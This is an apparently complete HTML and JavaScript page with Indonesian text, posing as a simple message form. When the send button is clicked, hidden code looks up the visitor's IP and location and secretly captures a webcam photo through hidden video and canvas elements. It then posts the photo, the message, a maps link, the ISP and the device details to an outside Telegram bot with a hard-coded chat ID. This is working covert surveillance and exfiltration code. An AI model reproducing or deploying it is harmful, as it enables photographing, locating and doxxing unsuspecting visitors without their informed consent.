<input type="text" id="pesan" placeholder="Ketik pesanmu">
<video id="video" autoplay style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<button onclick="kirim()">Kirim</button>

<script>
async function kirim() {
  const pesan = document.getElementById("pesan").value;
  if (!pesan.trim()) return alert("Pesan tidak boleh kosong!");

  try {
    // Dapatkan data IP
    const ip = await fetch("https://ipapi.co/json/").then(res => res.json());

    // Ambil video dari webcam
    const video = document.getElementById("video");
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    await new Promise(resolve => setTimeout(resolve, 1500)); // tunggu 1.5 detik agar video aktif

    // Capture foto dari video
    const canvas = document.getElementById("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    // Stop kamera
    stream.getTracks().forEach(track => track.stop());

    // Convert gambar ke blob
    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

    // Buat form untuk kirim ke Telegram
    const form = new FormData();
    form.append("chat_id", "7607549215");
    form.append("caption", `
📩 Pesan Baru Masuk:
💬 *Pesan*: ${pesan}

🌍 *IP*: ${ip.ip}
🏙️ *Kota*: ${ip.city}
🗺️ *Wilayah*: ${ip.region}
🌐 *Negara*: ${ip.country_name}
📍 *Maps*: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
🏢 *ISP*: ${ip.org}
🖥️ *Device*: ${navigator.userAgent}
    `.trim());
    form.append("photo", blob, "foto.jpg");

    // Kirim ke Telegram
    await fetch("https://api.telegram.org/bot<YOUR_TOKEN>/sendPhoto", {
      method: "POST",
      body: form
    });

    alert("Pesan + Foto berhasil dikirim 😎");
    document.getElementById("pesan").value = "";

  } catch (e) {
    console.error(e);
    alert("Gagal mengirim pesan/foto.");
  }
}
</script>